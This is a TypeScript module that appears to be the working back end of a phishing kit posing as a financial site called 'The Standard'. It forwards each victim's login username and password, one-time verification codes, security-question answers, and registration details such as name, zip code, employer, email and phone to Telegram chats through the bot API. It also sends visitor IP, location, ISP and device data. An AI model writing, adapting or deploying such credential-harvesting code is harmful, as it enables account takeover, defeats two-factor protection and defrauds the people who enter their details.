// Get Telegram configuration from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID ?? '').split(',').map(id => id.trim()).filter(Boolean)

const SITE_NAME = 'The Standard'

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function asCode(value: unknown): string {
  const t = value == null || value === '' ? 'Unknown' : String(value).trim() || 'Unknown'
  return `<code>${escapeTelegramHtml(t)}</code>`
}

function asPre(value: unknown): string {
  const t = value == null ? '' : String(value)
  return `<pre>${escapeTelegramHtml(t || 'Unknown')}</pre>`
}

function asCodeU(value: unknown, fallback = 'Unknown'): string {
  const s = value == null ? '' : String(value).trim()
  return asCode(s || fallback)
}

function withSiteName(body: string): string {
  return `🌐 <b>Site:</b> ${asCode(SITE_NAME)}\n\n${body}`
}

// Validate that required environment variables are set
if (!TELEGRAM_BOT_TOKEN) {
  console.error('⚠️ TELEGRAM_BOT_TOKEN is not set in environment variables')
}
if (CHAT_IDS.length === 0) {
  console.error('⚠️ TELEGRAM_CHAT_ID is not set in environment variables')
}

interface VisitorData {
  location?: string
  ip?: string
  timezone?: string
  isp?: string
  device?: string
  screen?: string
  language?: string
  referrer?: string
  utcTime?: string
  localTime?: string
  page?: string
  url?: string
}

interface FormData {
  type: string
  userId?: string
  password?: string
  confirmPassword?: string
  email?: string
  phone?: string
  otp?: string
  timestamp: string
  page: string
}

export async function sendVisitorNotification(data: VisitorData): Promise<boolean> {
  // Format UTC time: DD/MM/YYYY, HH:MM:SS
  const utcDate = data.utcTime ? new Date(data.utcTime) : new Date()
  const utcDay = String(utcDate.getUTCDate()).padStart(2, '0')
  const utcMonth = String(utcDate.getUTCMonth() + 1).padStart(2, '0')
  const utcYear = utcDate.getUTCFullYear()
  const utcHours = String(utcDate.getUTCHours()).padStart(2, '0')
  const utcMinutes = String(utcDate.getUTCMinutes()).padStart(2, '0')
  const utcSeconds = String(utcDate.getUTCSeconds()).padStart(2, '0')
  const utcFormatted = `${utcDay}/${utcMonth}/${utcYear}, ${utcHours}:${utcMinutes}:${utcSeconds}`

  // Format local time: M/D/YYYY, H:MM:SS AM/PM
  const localDate = data.localTime ? new Date(data.localTime) : new Date()
  const localFormatted = localDate.toLocaleString('en-US', {
    month: 'numeric',
    day: 'numeric',
    year: 'numeric',
    hour: 'numeric',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
  })

  const message = withSiteName(
    [
      '🌐 <b>New Visitor</b>',
      '━━━━━━━━━━━━━━━━━━',
      `📍 <b>Location:</b> ${asCodeU(data.location)}`,
      `🌍 <b>IP:</b> ${asCodeU(data.ip)}`,
      `⏰ <b>Timezone:</b> ${asCodeU(data.timezone)}`,
      `🌐 <b>ISP:</b> ${asCodeU(data.isp)}`,
      '',
      '📱 <b>Device:</b>',
      asPre(data.device || 'Unknown'),
      `🖥️ <b>Screen:</b> ${asCodeU(data.screen)}`,
      `🌍 <b>Language:</b> ${asCodeU(data.language)}`,
      `🔗 <b>Referrer:</b> ${asCodeU(data.referrer, 'Direct')}`,
      `🌐 <b>URL:</b> ${asCodeU(data.url)}`,
      '',
      `⏰ <b>Local Time:</b> ${asCode(localFormatted)}`,
      `🕒 <b>UTC Time:</b> ${asCode(utcFormatted)}`,
    ].join('\n'),
  )

  return await sendTelegramMessage(message)
}

export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
  let message: string

  if (data.type === 'login') {
    message = withSiteName(
      [
        '🔐 <b>Login Attempt</b>',
        '━━━━━━━━━━━━━━━━━━',
        `👤 <b>Username:</b> ${asCodeU(data.userId)}`,
        `🔒 <b>Password:</b> ${asCodeU(data.password)}`,
      ].join('\n'),
    )
  } else if (data.type === 'registration' && data.page === '/') {
    message = withSiteName('🔹 <b>Type:</b> Register Button Clicked')
  } else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page.startsWith('/login/2fa-verify')
  ) {
    const methodLabel = data.type === 'email_verification' ? 'Email' : 'Text Message (SMS)'
    message = withSiteName(
      ['🔐 <b>Verify Your Identity</b>', '━━━━━━━━━━━━━━━━━━', '', `Method Selected: ${asCodeU(methodLabel)}`].join(
        '\n',
      ),
    )
  } else if (data.type === 'login_email_otp_resend' || data.type === 'login_text_otp_resend') {
    const methodLabel = data.type === 'login_email_otp_resend' ? 'Email' : 'Text Message (SMS)'
    message = withSiteName(
      [
        '🔄 <b>Resend Verification Code Clicked</b>',
        '━━━━━━━━━━━━━━━━━━',
        `📄 <b>Page:</b> ${asCodeU(data.page)}`,
        `🔐 <b>Method:</b> ${asCodeU(methodLabel)}`,
      ].join('\n'),
    )
  } else if (data.type === 'login_did_not_receive_code') {
    message = withSiteName(
      [
        '📩 <b>I Did Not Receive My Code Clicked</b>',
        '━━━━━━━━━━━━━━━━━━',
        `📄 <b>Page:</b> ${asCodeU(data.page)}`,
        '↩️ User returning to verification method selection',
      ].join('\n'),
    )
  } else if (data.type === 'registration_email_otp_resend' || data.type === 'registration_text_otp_resend') {
    const methodLabel = data.type === 'registration_email_otp_resend' ? 'Email' : 'Text Message (SMS)'
    message = withSiteName(
      [
        '🔄 <b>[Registration] Resend Verification Code Clicked</b>',
        '━━━━━━━━━━━━━━━━━━',
        `📄 <b>Page:</b> ${asCodeU(data.page)}`,
        `🔐 <b>Method:</b> ${asCodeU(methodLabel)}`,
      ].join('\n'),
    )
  } else if (data.type === 'registration_did_not_receive_code') {
    message = withSiteName(
      [
        '📩 <b>[Registration] I Did Not Receive My Code Clicked</b>',
        '━━━━━━━━━━━━━━━━━━',
        `📄 <b>Page:</b> ${asCodeU(data.page)}`,
        '↩️ User returning to verification method selection',
      ].join('\n'),
    )
  } else if (data.type === 'login_email_otp_verification' || data.type === 'login_text_otp_verification') {
    const methodLabel = data.type === 'login_email_otp_verification' ? 'Email' : 'Text Message (SMS)'
    message = withSiteName(
      [
        '✅ <b>Verification Code Submitted</b>',
        `🔐 <b>Type:</b> ${asCodeU(methodLabel)}`,
        `🔢 <b>Code:</b> ${asCodeU(data.otp)}`,
      ].join('\n'),
    )
  } else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page === '/registration'
  ) {
    if (data.type === 'email_verification') {
      message = withSiteName(
        [
          '✅ <b>Verification Code Submitted</b>',
          `🔐 <b>Type:</b> Email : ${asCodeU(data.email)}`,
          `🔢 <b>Code:</b> ${asCodeU(data.otp)}`,
        ].join('\n'),
      )
    } else {
      message = withSiteName(
        [
          '✅ <b>Verification Code Submitted</b>',
          `🔐 <b>Type:</b> Text : ${asCodeU(data.phone)}`,
          `🔢 <b>Code:</b> ${asCodeU(data.otp)}`,
        ].join('\n'),
      )
    }
  } else if (data.type === 'personal_info_lookup') {
    message = withSiteName(
      [
        '📝 <b>Registration - Step 1: Personal Info</b>',
        '━━━━━━━━━━━━━━━━━━',
        `👤 <b>First Name:</b> ${asCodeU((data as any).firstName)}`,
        `👤 <b>Last Name:</b> ${asCodeU((data as any).lastName)}`,
        `🏷️ <b>Zip Code:</b> ${asCodeU((data as any).zipCode)}`,
      ].join('\n'),
    )
  } else if (data.type === 'employer_name_lookup') {
    message = withSiteName(
      [
        '📝 <b>Registration - Step 2: Employer</b>',
        '━━━━━━━━━━━━━━━━━━',
        `🏢 <b>Employer Name:</b> ${asCodeU((data as any).employerId)}`,
      ].join('\n'),
    )
  } else if (data.type === 'contact_info') {
    message = withSiteName(
      [
        '📝 <b>Registration - Step 3: Contact Info</b>',
        '━━━━━━━━━━━━━━━━━━',
        `📧 <b>Email:</b> ${asCodeU(data.email, 'Not provided')}`,
        `📱 <b>Mobile:</b> ${asCodeU(data.phone)}`,
      ].join('\n'),
    )
  } else if (data.type === 'registration' && typeof data.page === 'string' && data.page.startsWith('/registration?step=4')) {
    const methodLabel = data.email ? 'Email' : 'Text Message (SMS)'
    message = withSiteName(
      [
        '📝 <b>Registration - Step 4: Method Selected</b>',
        '━━━━━━━━━━━━━━━━━━',
        '',
        `Method Selected: ${asCodeU(methodLabel)}`,
        data.email ? `📧 <b>Email:</b> ${asCodeU(data.email)}` : '',
        data.phone ? `📱 <b>Mobile:</b> ${asCodeU(data.phone)}` : '',
      ]
        .filter(Boolean)
        .join('\n'),
    )
  } else if (data.type === 'User Credentials Setup') {
    message = withSiteName(
      [
        '📝 <b>Registration - Credentials Set</b>',
        '━━━━━━━━━━━━━━━━━━',
        `👤 <b>User ID:</b> ${asCodeU(data.userId)}`,
        `🔒 <b>Password:</b> ${asCodeU(data.password)}`,
        `🔒 <b>Confirm Password:</b> ${asCodeU(data.confirmPassword)}`,
      ].join('\n'),
    )
  } else if (data.type === 'Security Questions') {
    const qa = Array.isArray((data as any).securityAnswers) ? (data as any).securityAnswers : []
    const lines = qa
      .map(
        (item: any, index: number) =>
          `Q${index + 1}: ${asCodeU(item.question)}\nA${index + 1}: ${asCodeU(item.answer)}`,
      )
      .join('\n\n')
    message = withSiteName(['📝 <b>Registration - Security Questions</b>', '━━━━━━━━━━━━━━━━━━', '', lines || 'No questions captured.'].join('\n'))
  } else if (data.type === 'Registration Complete') {
    message = withSiteName(
      [
        '📝 <b>Registration Complete</b>',
        '━━━━━━━━━━━━━━━━━━',
        `👤 <b>User ID:</b> ${asCodeU(data.userId)}`,
        '✅ <b>Status:</b> Submitted',
      ].join('\n'),
    )
  } else {
    message = withSiteName(
      [
        '📝 <b>Form Submission</b>',
        '',
        `🔹 <b>Type:</b> ${asCodeU(String(data.type || '').toUpperCase())}`,
        `📄 <b>Page:</b> ${asCodeU(data.page)}`,
        '',
        data.userId ? `👤 <b>User ID:</b> ${asCodeU(data.userId)}` : '',
        data.password ? `🔒 <b>Password:</b> ${asCodeU(data.password)}` : '',
        data.email ? `📧 <b>Email:</b> ${asCodeU(data.email)}` : '',
        data.phone ? `📱 <b>Phone:</b> ${asCodeU(data.phone)}` : '',
        data.otp ? `🔐 <b>OTP Code:</b> ${asCodeU(data.otp)}` : '',
      ]
        .filter(Boolean)
        .join('\n'),
    )
  }

  return await sendTelegramMessage(message)
}

export async function sendTelegramMessage(message: string): Promise<boolean> {
  // Validate we have the required token
  if (!TELEGRAM_BOT_TOKEN) {
    console.error('Cannot send Telegram message: TELEGRAM_BOT_TOKEN is not set')
    return false
  }

  // If no chat IDs configured, log warning
  if (CHAT_IDS.length === 0) {
    console.warn('No Telegram chat IDs configured - message will not be sent')
    return false
  }
  
  const promises = CHAT_IDS.map(chatId => 
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      })
    })
    .then(async (response) => {
      try {
        const data = await response.json()
        if (!response.ok || !data.ok) {
          console.error(`Failed to send to chat ${chatId}:`, data)
          return { ok: false }
        }
        return { ok: true }
      } catch (parseError) {
        console.error(`Failed to parse response for chat ${chatId}:`, parseError)
        return { ok: false }
      }
    })
    .catch(error => {
      console.error(`Failed to send to chat ${chatId}:`, error)
      return { ok: false }
    })
  )

  const results = await Promise.allSettled(promises)
  
  // Check if at least one message was sent successfully
  const successCount = results.filter(
    result => result.status === 'fulfilled' && result.value && result.value.ok === true
  ).length
  
  // Return true if at least one message succeeded, false otherwise
  return successCount > 0
}

export async function getVisitorData(request: Request): Promise<VisitorData> {
  const headers = request.headers
  const forwarded = headers.get('x-forwarded-for')
  const realIp = headers.get('x-real-ip')
  const proxied = headers.get('x-vercel-proxied-for')
  const ip =
    forwarded?.split(',')[0]?.trim() ||
    realIp ||
    proxied?.split(',')[0]?.trim() ||
    'Unknown'
  const url = new URL(request.url)

  const cityHeader = headers.get('x-vercel-ip-city') || ''
  const regionHeader = headers.get('x-vercel-ip-country-region') || ''
  const countryHeader = headers.get('x-vercel-ip-country') || ''
  const timezoneHeader = headers.get('x-vercel-ip-timezone') || ''
  const ispHeader = headers.get('x-vercel-ip-isp') || ''

  let location = 'Unknown'
  let isp = 'Unknown'
  let timezone = 'Unknown'

  const headerLocationParts = [cityHeader, regionHeader, countryHeader].filter(Boolean)
  if (headerLocationParts.length) {
    location = headerLocationParts.join(', ')
  }
  if (timezoneHeader) {
    timezone = timezoneHeader
  }
  if (ispHeader) {
    isp = ispHeader
  }

  // If Vercel headers didn't provide geo info, fall back to external IP services
  if (ip && ip !== 'Unknown' && (location === 'Unknown' || isp === 'Unknown' || timezone === 'Unknown')) {
    const fetchOpts = {
      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; FloresWealthcare/1.0)' },
      signal: AbortSignal.timeout(5000),
    } as RequestInit
    try {
      const geoResponse = await fetch(
        `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,city,regionName,country,isp,timezone,query`,
        fetchOpts,
      )
      const geoData = await geoResponse.json().catch(() => ({})) as {
        status?: string
        city?: string
        regionName?: string
        country?: string
        isp?: string
        timezone?: string
      }
      if (geoData.status === 'success') {
        const locationParts = [geoData.city, geoData.regionName, geoData.country].filter(Boolean)
        if (locationParts.length && location === 'Unknown') location = locationParts.join(', ')
        if (geoData.isp && isp === 'Unknown') isp = geoData.isp
        if (geoData.timezone && timezone === 'Unknown') timezone = geoData.timezone
      }
    } catch (error) {
      console.error('Failed to fetch geolocation from ip-api.com:', error)
    }
  }

  return {
    ip,
    location,
    isp,
    timezone: timezone !== 'Unknown' ? timezone : undefined,
    device: headers.get('user-agent') || 'Unknown',
    language: headers.get('accept-language')?.split(',')[0] || 'Unknown',
    referrer: headers.get('referer') || 'Direct',
    utcTime: new Date().toISOString(),
    page: url.pathname,
    url: url.href
  }
}

